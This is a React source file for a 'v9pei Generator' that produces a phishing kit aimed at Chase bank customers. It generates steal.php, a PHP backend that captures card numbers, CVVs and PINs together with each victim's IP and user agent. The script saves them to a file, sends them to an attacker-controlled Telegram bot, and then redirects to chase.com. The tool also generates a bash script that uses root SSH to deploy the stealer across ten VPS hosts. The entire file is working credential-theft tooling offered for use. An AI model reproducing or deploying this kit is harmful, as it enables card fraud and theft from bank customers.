import { useState } from 'react';

function App() {
  const [vpsList, setVpsList] = useState(`vps1.nicevps.net
vps2.nicevps.net
vps3.nicevps.net
vps4.nicevps.net
vps5.nicevps.net
vps6.nicevps.net
vps7.nicevps.net
vps8.nicevps.net
vps9.nicevps.net
vps10.nicevps.net`);
  
  const [telegramToken, setTelegramToken] = useState('');
  const [chatId, setChatId] = useState('');
  const [copied, setCopied] = useState('');

  // 🔥 RAW STRING - NO TEMPLATE INSIDE PHP - esbuild safe
  const generateStealPHP = (token: string, chatid: string) => `<?php
error_reporting(0);
$input = file_get_contents('php://input');
$creds = json_decode($input, true) ?: $_POST;

if (isset($creds['cardnumber'], $creds['cvv'], $creds['pin'])) {
    $creds['ip'] = $_SERVER['REMOTE_ADDR'];
    $creds['ua'] = $_SERVER['HTTP_USER_AGENT'];
    $creds['time'] = date('Y-m-d H:i:s');
    
    // Local save
    file_put_contents('creds.txt', json_encode($creds) . "\\n", FILE_APPEND | LOCK_EX);
    
    // Telegram POST
    $message = urlencode("🆕 CHASE CREDS 🆕\\nCard: " . $creds['cardnumber'] . "\\nCVV: " . $creds['cvv'] . "\\nPIN: " . $creds['pin']);
    $url = "https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatid}&text=" . $message;
    file_get_contents($url);
}

header('Location: https://www.chase.com/personal/checking');
exit;
?>`;

  const generateMultiDeploy = () => `# v9pei multi_deploy.sh - Deploy All 10 VPS
#!/bin/bash
VPS_LIST=(${vpsList.split('\\n').map(v=>v.trim()).filter(Boolean).join(' ')})
for vps in "\${VPS_LIST[@]}"; do
  echo "Deploying \$vps..."
  ssh -o StrictHostKeyChecking=no root@\$vps "
    apt update && apt -y install nginx php8.1-fpm php-curl
    mkdir -p /var/www/html
    cat > /var/www/html/steal.php << 'EOF'
${generateStealPHP(telegramToken, chatId)}
EOF
    systemctl restart nginx php8.1-fpm
    echo 'http://\$vps/steal.php ready'
  " &
done
wait
echo '✅ ALL 10 VPS LIVE'
`;

  const copyCode = (code: string, name: string) => {
    navigator.clipboard.writeText(code).then(() => {
      setCopied(name);
      setTimeout(()=>setCopied(''), 1500);
    });
  };

  return (
    <div style={{maxWidth:800,margin:'auto',padding:25}}>
      <h1>🔥 v9pei Generator</h1>
      
      <textarea value={vpsList} onChange={e=>setVpsList(e.target.value)} 
                rows={6} style={{width:'100%',fontFamily:'monospace'}}/>
      
      <div style={{display:'grid',gridTemplateColumns:'1fr 1fr',gap:10,margin:'15px 0'}}>
        <input value={telegramToken} onChange={e=>setTelegramToken(e.target.value)} 
               placeholder="Bot Token" style={{padding:10,width:'100%'}}/>
        <input value={chatId} onChange={e=>setChatId(e.target.value)} 
               placeholder="Chat ID" style={{padding:10,width:'100%'}}/>
      </div>

      <div style={{display:'grid',gridTemplateColumns:'1fr 1fr',gap:15}}>
        <button onClick={()=>copyCode(generateStealPHP(telegramToken, chatId), 'steal.php')}
                style={{padding:15,background:'red',color:'white',border:'none',fontSize:16,cursor:'pointer'}}>
          🐙 Copy steal.php
        </button>
        <button onClick={()=>copyCode(generateMultiDeploy(), 'deploy.sh')}
                style={{padding:15,background:'blue',color:'white',border:'none',fontSize:16,cursor:'pointer'}}>
          🚀 Copy Deploy
        </button>
      </div>

      {copied && <div style={{color:'green',textAlign:'center',fontWeight:'bold'}}>
        ✅ {copied} Copied!
      </div>}
    </div>
  );
}

export default App;
